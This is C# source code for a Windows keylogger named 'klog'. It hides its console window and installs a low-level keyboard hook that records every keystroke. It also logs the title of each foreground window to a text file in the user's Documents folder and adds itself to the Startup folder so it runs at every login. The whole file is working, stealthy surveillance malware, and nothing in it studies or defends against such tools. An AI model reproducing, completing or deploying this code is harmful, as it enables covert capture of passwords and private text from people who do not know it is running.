using System.Runtime.InteropServices;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.UI.Accessibility;
using Windows.Win32.UI.WindowsAndMessaging;
using IWshRuntimeLibrary;
using Microsoft.Win32;
using File = System.IO.File;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    private static readonly LogBuffer Buffer = new();
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static bool _capsLockActive;
    private static bool _shiftActive;

    public static unsafe void Main()
    {
        HideWindow();
        // allows cleanup (buffer write) in case of WM_CLOSE message
        CreateHiddenWindow();

        var logFile =
            new LogFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt"));
        logFile.WriteStartTime();
        Buffer.AddOutput(logFile);

        _capsLockActive = Keyboard.GetCapsLockState();

        // system resumed from sleep
        SystemEvents.PowerModeChanged += (_, e) =>
        {
            if (e.Mode != PowerModes.Resume) return;
            // this line avoids wrong detection of caps lock state after the system goes to sleep
            _capsLockActive = Keyboard.GetCapsLockState();
            // need to write the time of when the system was resumed, as it's effectively the same as turning it on
            logFile.WriteStartTime();
        };

        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);

        // install alt-tab hook
        PInvoke.SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND,
            EVENT_SYSTEM_FOREGROUND,
            HMODULE.Null,
            LogNewWindowTitle,
            0,
            0,
            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);

        // add the program to the startup directory
        AddToStartup();

        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
    }

    /// <summary>
    ///     Logs key presses to a file. Meant to be used with SetWindowsHookEx.
    /// </summary>
    private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();

        // checking for events other than keydown, syskeydown and keyup
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        var stringToWrite = "";

        // check for keydown
        if (wParam == KEYDOWN || wParam == SYSKEYDOWN)
            stringToWrite = Keyboard.HandleKeyDown(kbStruct, ref _shiftActive, ref _capsLockActive);

        // handle keyup events as it is important with shift, alt and control
        if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);

        Buffer.Add(stringToWrite);

        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }

    /// <summary>
    ///     Adds the title of the newly switched window to the buffer.
    /// </summary>
    private static void LogNewWindowTitle(HWINEVENTHOOK hWinEventHook, uint e, HWND hwnd, int idObject,
        int idChild, uint idEventThread, uint dwmsEventTime)
    {
        var title = GetWindowTitle(hwnd);
        Buffer.Add(title == string.Empty
            ? $"No window in focus{Environment.NewLine}"
            : $"{GetWindowTitle(hwnd)}{Environment.NewLine}");
    }

    /// <summary>
    ///     Writes the buffer.
    /// </summary>
    private static void HandleCleanup()
    {
        Buffer.Write();
    }

    /// <summary>
    ///     Hides current console window.
    /// </summary>
    private static void HideWindow()
    {
        var hWnd = PInvoke.GetConsoleWindow();
        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
    }

    /// <summary>
    ///     Adds a shortcut to the executable to user's startup folder.
    /// </summary>
    private static void AddToStartup()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var shortcutPath = Path.Combine(startupFolderPath, "klog.lnk");
        var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "klog.exe");

        if (File.Exists(shortcutPath)) return;
        var wsh = new WshShell();
        if (wsh.CreateShortcut(shortcutPath) is not IWshShortcut shortcut) return;
        shortcut.TargetPath = path;
        shortcut.Save();
    }

    /// <summary>
    ///     Gets the title of a window based on its <c>HWND</c>
    /// </summary>
    /// <param name="handle"><c>HWND</c> to be checked</param>
    /// <returns>Title of the window</returns>
    private static unsafe string GetWindowTitle(HWND handle)
    {
        var strLength = PInvoke.GetWindowTextLength(handle) + 1;
        var buffer = stackalloc char[strLength];
        if (PInvoke.GetWindowText(handle, buffer, strLength) > 0)
            return Marshal.PtrToStringAuto((IntPtr)buffer) ?? string.Empty;
        return string.Empty;
    }

    /// <summary>
    ///     Creates a hidden window to catch <c>WM_CLOSE</c> message and use it in <see cref="WindowProcedure" />.
    /// </summary>
    private static unsafe void CreateHiddenWindow()
    {
        fixed (char* windowClassName = "klogclass")
        {
            // Register window class
            var wndClass = new WNDCLASSW
            {
                lpfnWndProc = WindowProcedure,
                lpszClassName = windowClassName
            };
            PInvoke.RegisterClass(wndClass);

            var windowName = stackalloc char[0];
            _ = PInvoke.CreateWindowEx(
                WINDOW_EX_STYLE.WS_EX_LEFT,
                windowClassName,
                windowName,
                0,
                0, 0, 0, 0,
                HWND.Null,
                HMENU.Null,
                HINSTANCE.Null,
                null);
        }
    }

    /// <summary>
    ///     Clean up on WM_CLOSE.
    /// </summary>
    private static LRESULT WindowProcedure(HWND hwnd, uint uMsg, WPARAM wParam, LPARAM lParam)
    {
        if (uMsg == WM_CLOSE) HandleCleanup();
        return PInvoke.DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    // ReSharper disable InconsistentNaming
    // codes passed by the keyboard hook
    private const int KEYDOWN = 0x0100;
    private const int KEYUP = 0x0101;

    private const int SYSKEYDOWN = 0x0104;

    private const int WM_CLOSE = 0x0010;

    // reference https://referencesource.microsoft.com/#UIAutomationClient/MS/Win32/NativeMethods.cs,f66435563fb4ebdf,references
    private const int WINEVENT_OUTOFCONTEXT = 0x0000;
    private const int WINEVENT_SKIPOWNPROCESS = 0x0002;

    private const int EVENT_SYSTEM_FOREGROUND = 0x0003;
    // ReSharper restore InconsistentNaming
}

public interface ILogger
{
    public void Write(LogBuffer buffer);
}